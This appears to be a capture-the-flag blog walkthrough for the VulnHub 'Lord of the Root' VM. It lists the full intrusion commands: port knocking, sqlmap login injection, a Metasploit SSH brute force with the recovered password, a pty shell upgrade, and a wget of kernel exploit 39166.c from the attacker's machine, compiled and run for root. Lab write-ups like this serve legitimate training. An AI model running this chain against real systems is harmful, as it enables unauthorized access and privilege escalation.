@@ -1,0 +1,90 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Lord of the Root VM (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-lord-root-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-11-06T08:23:21+00:00">November 6, 2016</time><time class="updated" datetime="2025-06-10T20:30:27+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">This is another Boot2Root challenge which has been prepared by KoocSec for hacking exercises. He prepared this through the inspiration of his OSCP exam. It is based on the concepts of great novel-turned-movie The Lord Of The Ring.</span></p>
+<p><span style="color: #000000;">You can download this VM from –&gt; <a style="color: #000000;" href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a></span></p>
+<h3><span style="color: #800000;"><strong>Breaching Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Port knocking</span></li>
+<li><span style="color: #000000;">Use robot.txt</span></li>
+<li><span style="color: #000000;">Login Form Based SQL Injection (Sqlmap)</span></li>
+<li><span style="color: #000000;">SSH brute force (Metasploit)</span></li>
+<li><span style="color: #000000;">Get into the shell for privilege escalation</span></li>
+<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
+<li><span style="color: #000000;">Kernel Privilege Escalation</span></li>
+<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
+</ul>
+<p><span style="color: #000000;">Firstly, we will find our target.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OIEASvF21aw/WuamMVB_cnI/AAAAAAAAWkU/3PphLUjW_jE65USw01-W3bUlyJblUGYGQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Our target is<strong> 192.168.1.101</strong></span></p>
+<p><span style="color: #000000;">Now run the nmap script to know the ports and protocols.</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.101</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-JXaCAmBPn0I/WuamN2iBnBI/AAAAAAAAWk0/ZzJjX4YPRYUtZhKvqJiKr0JxKbHsTC4BQCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Nmap has resulted in showing us that only <strong>22</strong> port is open with the service of <strong>SSH</strong>. Port 80 is not open that means we don’t have a facility of opening this server in the browser. Therefore we will try to see what port 22 has to offer and so go to your terminal in Kali and type:</span></p>
+<pre class="lang:default decode:true">ssh 192.168.1.101 22</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HBwXLHNvMY4/WuamOEEDzsI/AAAAAAAAWk4/3Xt2eRBGDPIkGmzS5KzfpzTZ3RppKr3cACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">When I searched SSH it said <strong>“Knock Friend To Enter”</strong> and <strong>“Easy as 123”</strong> and then it asks for a password that we do not know yet. Now, this is hinting towards port knocking. Let’s try it:</span></p>
+<pre class="lang:default decode:true">nmap -r -Pn –p 1,2,3 192.168.1.101</pre>
+<p><span style="color: #000000;">Now again fire up nmap scan. This time hopefully we will have more than one port in the result.</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.101</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-vmO2_IR_-og/WuamOlEdCvI/AAAAAAAAWk8/OsBKzOcq6RQbsZ7AwEnsSwF3T8PZX8jWgCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">As you can see there is one more port open in comparison to our previous scan i.e. <strong>1337</strong> which has the service of <strong>HTTP</strong> and this is all we wanted as by default port 80 was not open. Let’s open our target IP with this port.</span></p>
+<pre class="lang:default decode:true">192.168.1.101:1337</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-D_Ae2MMc9F8/WuamPUrBflI/AAAAAAAAWlI/eeIvbOB5yEYqxKGAU9R5R16bYN-CglhygCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">It opens a page with only one image, as shown above, then we have also checked its source code but didn’t get any clue. Generally, there are always some chances of getting robots.txt file inside a web directory, therefore, while penetrating any system we should always check for the robots.txt file.</span></p>
+<p><span style="color: #000000;">Here we had tested for robots.txt it in url <strong>192.168.1.101:1337/robots.txt, </strong>a new web page will following image gets opened.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WEMx0jeulQE/WuamPT9Et4I/AAAAAAAAWlE/pH5PMtyTuOMuWx89Cr8TcV_mUSXAAQ11ACLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">After then we looked into its source code and found base 64 encoded value.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IyTll__vsck/WuamPGAeiPI/AAAAAAAAWlA/0GGHqB_-n4kNE-ejtrzIrkg-RN-mfVaCgCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Further, we have decoded it twice in kali as shown below and found a directory from inside that. Let’s open it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-nYn8kc7ccdM/WuamPuq6WaI/AAAAAAAAWlM/nEFUAX1bRB82JIPmwXuoLXGDw_Bl88x9wCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">And now we are face to face with a login portal. Now here I will try to log in with help of SQL injection and for that, we can use sqlmap.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UPyCof67MD8/WuamPkN4ZbI/AAAAAAAAWlQ/OoAN_IECK_8OVjbeFtqgeoF7mekv_9TZwCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Since we don’t know the exact username and password, therefore, we have used SQLMAP for login form based injection for retrieving the database name and login credential by executing following command.</span></p>
+<pre class="lang:default decode:true">sqlmap -u 'http://192.168.1.101:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
+</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-UayrNjE_QXU/WuamMipbueI/AAAAAAAAWkc/N7ZXvMmWr6ktuyoS9N56rHWVan3WeCyiwCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">And it will start gathering the database.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RwX1ayfn4A8/WuamMqnGcAI/AAAAAAAAWkY/Mft8FbyE2Ko4MNODtU9pyi-MA2xiMbuPgCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">And finally, it will show you the database of usernames and passwords.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-fiKfmaIYbKo/WuamNO1sv-I/AAAAAAAAWkg/ZulxYI_3-OIRI6_FAug704rBqRl0RPm4wCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Moving on save all of these usernames and password in two different text files. And use this text files in an SSH log in attack with the help of Brute force method. And to execute this attack go to the terminal in Kali and open Metasploit by typing <strong>msfconsole </strong>and further type :</span></p>
+<pre class="lang:default decode:true">use auxiliary/scanner/ssh/ssh_login
+msf exploit (scanner/ssh/ssh_login)&gt;set rhosts 192.168.1.101
+msf exploit (scanner/ssh/ssh_login)&gt;set user_file /root/Desktop/user.txt
+msf exploit (scanner/ssh/ssh_login)&gt;set pass_file /root/Desktop/pass.txt
+msf exploit (scanner/ssh/ssh_login)&gt; set stop_on_success true
+msf exploit (scanner/ssh/ssh_login)&gt;exploit</pre>
+<p><span style="color: #000000;">And as a result, it will show you the correct username and password i.e. <strong>smeagol:MyPreciousR00t. </strong>Moreover, Metasploit serves you an additional benefit by providing a remote system command shell as unauthorized access into the victim’s system. Now start penetrating for accessing root privilege. Then to access proper TTY shell we had import python one line script by typing following:</span></p>
+<pre class="lang:default decode:true ">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Now you will reach the terminal. Here, type the following command to know the version of the kernel:</span></p>
+<pre class="lang:default decode:true ">lsb_release -a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2G1gbAs2LvI/WuamNCXb9pI/AAAAAAAAWkk/Rf56FdKajnooT04My3RB7QiT3XmVw9zcgCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">The version is <strong>14.04 </strong>and luckily we have an exploit for this version. In the Kali terminal lets the search for the appropriate exploit and for this type:</span></p>
+<pre class="lang:default decode:true">searchsploit ubuntu 14.04</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WSu298CTiTs/WuamNYxtuuI/AAAAAAAAWko/BwoEWptv7t028s2cegkW0ql7WrNQhS5gQCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Copy the exploit on the desktop with help of cp command and run HTTP python server for transferring it into the target’s machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j6Ain7WsCxw/WuamNuvzcPI/AAAAAAAAWks/AThVrrp6c1seFYhEIAcC-NmAnp8r80ikgCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">First, we need to f download the exploit and compile it and for this type:</span></p>
+<pre class="lang:default decode:true ">wget http://192.168.1.108/39166.c
+gcc 39166.c -o shell</pre>
+<p><span style="color: #000000;">The first command in the above commands will download the exploit and the second one will compile it and save it in the file named <strong>shell</strong>. Next, we have to give permission to the shell and then, at last, we have to run it.</span></p>
+<pre class="lang:default decode:true">chmod 777 shell
+./shell</pre>
+<p><span style="color: #000000;">Now let’s get into the root folder and see what it has to offer:</span></p>
+<pre class="lang:default decode:true">cd /root
+ls</pre>
+<p><span style="color: #000000;">Here, we have found a text file with the name flag which was our ultimate goal. So now no more waiting lets read it.</span></p>
+<pre class="lang:default decode:true">cat Flag.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HIfN1xTwCUU/WuamN0p68zI/AAAAAAAAWkw/WqyRyQAsgD0zpUxtk1B3Y1B5hhR99G0GwCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
